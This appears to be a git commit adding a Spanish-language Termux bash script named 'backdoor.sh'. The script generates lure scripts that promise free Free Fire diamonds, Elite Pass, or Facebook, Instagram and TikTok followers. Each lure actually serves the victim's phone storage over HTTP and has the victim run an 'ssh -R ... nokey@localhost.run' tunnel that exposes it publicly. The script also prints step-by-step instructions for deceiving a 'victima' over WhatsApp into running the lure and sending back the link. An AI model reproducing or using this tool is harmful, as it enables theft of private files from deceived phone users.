c013bf2f6c11919da2babcc28bb223a7fc64d524
MRX90902WX <118016739+MRX90902WX@users.noreply.github.com>
2022-12-05 01:16:35 -0500

    Add files via upload

---
+++ backdoor.sh
@@ -0,0 +1,563 @@
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which figlet >/dev/null; then
+sleep 1
+echo ""
+echo  "(figlet) ................................................... Instalado [✓]"
+else
+sleep 1
+echo  "$(figlet) No instalado [✗]"
+sleep 1
+echo  "Instalando figlet ..."
+sleep 3
+pkg install figlet
+fi
+
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ""
+echo  "(python) ................................................... Instalado [✓]"
+else
+sleep 1
+echo  "(python) No instalado [✗]"
+sleep 1
+echo "Instalando python ..."
+sleep 3
+pkg install python -y
+fi
+clear
+
+setterm -foreground green
+figlet Backdoor
+setterm -foreground white
+echo ""
+echo -e "  \e[1;37;41m[ ARCHIVOS DE ALMACENAMIENTO INTERNO ]\e[0m"
+echo -e "            \e[1;32;45mCreador: MRX90902WX\e[0m"
+while :
+do
+#Menú
+#Escojeg menú
+setterm -foreground green
+echo "-------------------------"
+echo "| SELECIONA EL BACKDOOR |"
+setterm -foreground green
+echo "-------------------------"
+echo -e "\e[1;32m|\e[0m \e[1;35m  [1].\e[0m\e[1;36m FREFIRE\e[0m        \e[1;32m|\e[0m"
+echo -e "\e[1;32m|\e[0m \e[1;35m  [2].\e[0m\e[1;36m PASE ELITE\e[0m     \e[1;32m|\e[0m"
+echo -e "\e[1;32m|\e[0m \e[1;35m  [3].\e[0m\e[1;36m FACEBOOK\e[0m       \e[1;32m|\e[0m"
+echo -e "\e[1;32m|\e[0m \e[1;35m  [4].\e[0m\e[1;36m INSTAGRAN\e[0m      \e[1;32m|\e[0m"
+echo -e "\e[1;32m|\e[0m \e[1;35m  [5].\e[0m\e[1;36m TIKTOK\e[0m         \e[1;32m|\e[0m"
+setterm -foreground green
+echo "-------------------------"
+echo -e -n "\e[1;33m [*]\e[0m\e[1;31mOPCION\e[0m \e[1;34m>>\e[0m "
+read opcion
+clear
+#Seleccion de menu
+case $opcion in
+1)
+echo "
+cd /sdcard
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which figlet >/dev/null; then
+sleep 1
+echo ''
+echo  '(figlet) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(figlet) No instalado [✗]'
+sleep 1
+echo  'Instalando figlet ...'
+sleep 3
+pkg install figlet
+fi
+
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ''
+echo  '(python) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(python) No instalado [✗]'
+sleep 1
+echo 'Instalando python ...'
+sleep 3
+pkg install python -y
+fi
+clear
+
+setterm -foreground green
+figlet FreeFire
+echo ''
+setterm -foreground red
+echo '------------------------------------------'
+echo -e '|\e[1;37;41m 💎 💎 💎 [ Hack De Diamantes ] 💎 💎 💎\e[0m\e[1;31m|\e[0m'
+setterm -foreground red
+echo '------------------------------------------'
+echo ''
+setterm -foreground green
+echo -n '[+]Escribe tu ID >> '
+read a
+echo ''
+echo -n '[+]Escribe los diamantes que deseas >> '
+read b
+echo ''
+sleep 1
+setterm -foreground cyan
+echo 'Al jugador se le esta agregando los Diamantes'
+echo ''
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo ''
+echo 'ssh -R 80:localhost:5443 nokey@localhost.run'
+echo ''
+python -m http.server 5443
+#
+" >> fre.sh
+setterm -foreground yellow
+echo 'Su backdoor fre.sh se guardo en su Almacenamiento Interno'
+echo 'Enviar fre.sh a la victima use Ingenieria Social'
+echo ''
+setterm -foreground green
+echo 'USO:'
+echo 'Enviar fre.sh le decimos que abra termux si no lo tiene le'
+echo ''
+echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo ''
+echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
+echo ''
+echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo ''
+echo 'Bueno una ves esto le enviamos el backdoor fre.sh por su wasap'
+echo ''
+echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
+echo ''
+echo 'con bash fre.sh le decimos que escriba su ID del Frefire y los diamantes'
+echo ''
+echo 'que desea agregar la victima  y le dicimos que de  enter'
+echo ''
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo ''
+echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
+echo ''
+echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo ''
+echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+exit
+#
+;;
+2)
+echo "
+cd /sdcard
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which figlet >/dev/null; then
+sleep 1
+echo ''
+echo  '(figlet) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(figlet) No instalado [✗]'
+sleep 1
+echo  'Instalando figlet ...'
+sleep 3
+pkg install figlet
+fi
+
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ''
+echo  '(python) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(python) No instalado [✗]'
+sleep 1
+echo 'Instalando python ...'
+sleep 3
+pkg install python -y
+fi
+clear
+
+setterm -foreground green
+figlet PaseElite
+echo ''
+setterm -foreground red
+echo '------------------------------------------'
+echo -e '|\e[1;37;41m 💻 💻 💻 [ Hack De PaseElite ] 💻 💻 💻\e[0m\e[1;31m|\e[0m'
+setterm -foreground red
+echo '------------------------------------------'
+echo ''
+setterm -foreground green
+echo -n '[+]Escribe tu ID >> '
+read a
+echo ''
+sleep 1
+setterm -foreground cyan
+echo 'Al jugador se le esta agregando el PaseElite'
+echo ''
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo ''
+echo 'ssh -R 80:localhost:5444 nokey@localhost.run'
+echo ''
+python -m http.server 5444
+#
+" >> pase.sh
+setterm -foreground yellow
+echo 'Su backdoor pase.sh se guardo en su Almacenamiento Interno'
+echo 'Enviar pase.sh a la victima use Ingenieria Social'
+echo ''
+setterm -foreground green
+echo 'USO:'
+echo 'Enviar pase.sh le decimos que abra termux si no lo tiene le'
+echo ''
+echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo ''
+echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
+echo ''
+echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo ''
+echo 'Bueno una ves esto le enviamos el backdoor pase.sh por su wasap'
+echo ''
+echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
+echo ''
+echo 'con bash pase.sh le decimos que escriba su ID del Frefire y le de enter'
+echo ''
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo ''
+echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
+echo ''
+echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo ''
+echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+exit
+#
+;;
+3)
+echo "
+cd /sdcard
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which figlet >/dev/null; then
+sleep 1
+echo ''
+echo  '(figlet) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(figlet) No instalado [✗]'
+sleep 1
+echo  'Instalando figlet ...'
+sleep 3
+pkg install figlet
+fi
+
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ''
+echo  '(python) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(python) No instalado [✗]'
+sleep 1
+echo 'Instalando python ...'
+sleep 3
+pkg install python -y
+fi
+clear
+
+setterm -foreground green
+figlet Facebook
+echo ''
+setterm -foreground red
+echo '-----------------------------------------'
+echo -e '|\e[1;37;41m ❣️ 🧑 💻 [ Hack De Seguidores ] ❣️ 🧑 💻\e[0m\e[1;31m|\e[0m'
+setterm -foreground red
+echo '-----------------------------------------'
+echo ''
+setterm -foreground green
+echo -n '[+]Escribe tu nombre de facebook >> '
+read a
+echo ''
+echo -n '[+]Escribe los seguidores que deseas tener >> '
+read b
+echo ''
+sleep 1
+setterm -foreground cyan
+echo 'A usted se le esta agregando los Seguidores'
+echo ''
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo ''
+echo 'ssh -R 80:localhost:5445 nokey@localhost.run'
+echo ''
+python -m http.server 5445
+#
+" >> facebook.sh
+setterm -foreground yellow
+echo 'Su backdoor facebook.sh se guardo en su Almacenamiento Interno'
+echo 'Enviar facebook.sh a la victima use Ingenieria Social'
+echo ''
+setterm -foreground green
+echo 'USO:'
+echo 'Enviar facebook.sh le decimos que abra termux si no lo tiene le'
+echo ''
+echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo ''
+echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
+echo ''
+echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo ''
+echo 'Bueno una ves esto le enviamos el backdoor facebook.sh por su wasap'
+echo ''
+echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
+echo ''
+echo 'con bash facebook.sh le decimos que escriba su nombre del facebook  y le'
+echo ''
+echo 'decimos que ingrese la cantidad de seguidores que desea tener'
+echo ''
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo ''
+echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
+echo ''
+echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo ''
+echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+exit
+#
+;;
+4)
+echo "
+cd /sdcard
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which figlet >/dev/null; then
+sleep 1
+echo ''
+echo  '(figlet) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(figlet) No instalado [✗]'
+sleep 1
+echo  'Instalando figlet ...'
+sleep 3
+pkg install figlet
+fi
+
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ''
+echo  '(python) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(python) No instalado [✗]'
+sleep 1
+echo 'Instalando python ...'
+sleep 3
+pkg install python -y
+fi
+clear
+
+setterm -foreground green
+figlet Instagram
+echo ''
+setterm -foreground red
+echo '-----------------------------------------'
+echo -e '|\e[1;37;41m ❣️ 🧑 💻 [ Hack De Seguidores ] ❣️ 🧑 💻\e[0m\e[1;31m|\e[0m'
+setterm -foreground red
+echo '-----------------------------------------'
+echo ''
+setterm -foreground green
+echo -n '[+]Escribe tu nombre de instagram >> '
+read a
+echo ''
+echo -n '[+]Escribe los seguidores que deseas tener >> '
+read b
+echo ''
+sleep 1
+setterm -foreground cyan
+echo 'A usted se le esta agregando los Seguidores'
+echo ''
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo ''
+echo 'ssh -R 80:localhost:5446 nokey@localhost.run'
+echo ''
+python -m http.server 5446
+#
+" >> instagram.sh
+setterm -foreground yellow
+echo 'Su backdoor instagram.sh se guardo en su Almacenamiento Interno'
+echo 'Enviar instagram.sh a la victima use Ingenieria Social'
+echo ''
+setterm -foreground green
+echo 'USO:'
+echo 'Enviar instagram.sh le decimos que abra termux si no lo tiene le'
+echo ''
+echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo ''
+echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
+echo ''
+echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo ''
+echo 'Bueno una ves esto le enviamos el backdoor instagram.sh por su wasap'
+echo ''
+echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
+echo ''
+echo 'con bash instagram.sh le decimos que escriba su nombre del instagram y le de enter'
+echo ''
+echo 'le decimos que ingrese la cantidad de seguidores que desea tener'
+echo ''
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo ''
+echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
+echo ''
+echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo ''
+echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+exit
+#
+;;
+5)
+echo "
+cd /sdcard
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which figlet >/dev/null; then
+sleep 1
+echo ''
+echo  '(figlet) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(figlet) No instalado [✗]'
+sleep 1
+echo  'Instalando figlet ...'
+sleep 3
+pkg install figlet
+fi
+
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ''
+echo  '(python) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(python) No instalado [✗]'
+sleep 1
+echo 'Instalando python ...'
+sleep 3
+pkg install python -y
+fi
+clear
+
+setterm -foreground green
+figlet TikTok
+echo ''
+setterm -foreground red
+echo '----------------------------------------'
+echo -e '|\e[1;37;41m ❣️ 🧑 💻 [ Hack De Seguidores ] ❣️ 🧑 💻\e[0m\e[1;31m|\e[0m'
+setterm -foreground red
+echo '----------------------------------------'
+echo ''
+setterm -foreground green
+echo -n '[+]Escribe tu nombre de TikTok >> '
+read a
+echo ''
+echo -n '[+]Escribe los seguidores que deseas tener >> '
+read b
+echo ''
+sleep 1
+setterm -foreground cyan
+echo 'A usted se le esta agregando los Seguidores'
+echo ''
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo ''
+echo 'ssh -R 80:localhost:5447 nokey@localhost.run'
+echo ''
+python -m http.server 5447
+#
+" >> tiktok.sh
+setterm -foreground yellow
+echo 'Su backdoor tiktok.sh se guardo en su Almacenamiento Interno'
+echo 'Enviar tiktok.sh a la victima use Ingenieria Social'
+echo ''
+setterm -foreground green
+echo 'USO:'
+echo 'Enviar tiktok.sh le decimos que abra termux si no lo tiene le'
+echo ''
+echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo ''
+echo 'que escriba termux-setup-storage y le de enter luego pkg install openssh'
+echo ''
+echo 'le de enter tambien, si es que ya tiene termux entonces no le decimos eso'
+echo ''
+echo 'Bueno una ves esto le enviamos el backdoor pase.sh por su wasap'
+echo ''
+echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
+echo ''
+echo 'con bash tiktok.sh le decimos que escriba su nombre del tiktok y le de enter'
+echo ''
+echo 'le decimos que ingrese la cantidad de seguidores que desea tener'
+echo ''
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo ''
+echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
+echo ''
+echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo ''
+echo 'el link y listo ya tenemos acceso a su almacenamiento interno'
+#
+exit
+;;
+esac
+done
+
